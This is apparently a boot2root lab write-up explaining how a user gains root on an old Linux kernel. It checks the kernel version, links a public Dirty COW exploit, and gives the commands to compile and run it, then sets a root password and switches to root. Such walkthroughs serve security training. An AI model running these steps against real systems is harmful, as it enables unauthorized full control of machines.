After getting access to user laurie (or any other user),
we can easily get access to the kernel linux version by typing:
    uname -r
And we get:
    3.2.0-91-generic-pae

After some reseach, we see that there is a race-condition vulnerability named "dirty cow" (CoW for copy-on-write).
It gives us access to write whatever we want on any file of the system

So we download the exploit: https://github.com/artemgurzhii/dirty-cow-root-exploit
(In our boot2root/scripts directory we have a concatenated version of this exploit)

We compile it:
    gcc -pthread dirtycow_exploit.c -lcrypt -o exploit
And use it.
    ./exploit
It asks us to choose a password, type whatever password you want (like toto)
    toto
Then press enter and wait, until it is over
And now you can use:
    su root
type the password that you just selected earlier (toto)
Aaaaaaaand we are root !
